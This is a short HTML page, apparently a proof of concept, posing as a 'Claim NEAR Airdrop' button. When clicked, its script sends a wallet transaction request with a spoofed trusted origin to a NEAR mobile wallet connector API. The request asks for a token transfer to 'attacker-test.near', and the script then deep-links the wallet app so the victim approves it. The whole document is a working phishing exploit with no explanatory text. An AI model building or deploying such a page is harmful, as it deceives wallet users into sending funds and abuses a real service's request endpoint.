<!DOCTYPE html>
<html>
<body>
<button onclick="go()" style="padding:20px;font-size:18px">Claim NEAR Airdrop</button>
<pre id="log"></pre>
<script>
async function go() {
  const body = {
    method: 'signAndSendTransaction',
    network: 'mainnet',
    origin: 'https://peersyst.com',          
    payload: {
      receiverId: 'attacker-test.near',          
      actions: [
        { type: 'Transfer', params: { deposit: '1000000000000000000000' } }
      ]
    }
  };
  const r = await fetch('https://near-mobile-production.aws.peersyst.tech/connector/request', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  });
  const j = await r.json();
  const id = j.id || (j.data && j.data.id);
  document.getElementById('log').textContent = JSON.stringify(j, null, 2);
  if (id) location.href = 'near-mobile-wallet://connector-request?id=' + id;
}
</script>
</body>
</html>
